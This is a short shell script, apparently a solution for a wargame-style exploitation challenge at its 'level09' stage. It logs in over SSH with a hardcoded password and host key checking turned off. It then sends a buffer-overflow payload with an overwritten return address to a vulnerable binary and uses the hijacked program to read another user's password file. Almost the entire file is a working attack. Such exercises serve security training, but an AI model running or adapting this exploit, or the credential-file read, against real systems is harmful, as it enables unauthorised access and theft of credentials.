#!/bin/sh
PASS='fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S'
sshpass -p $PASS ssh -q -tt -o StrictHostKeyChecking=no level09@$OVERRIDE -p 4242 << EOF
rm /tmp/leve03
(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + 'cat /home/users/end/.pass' ") | ./level09 > /tmp/level09
echo -e "\e[32m\$(awk 'NR==1 {print; exit}' /tmp/level09)\e[39m"
exit
EOF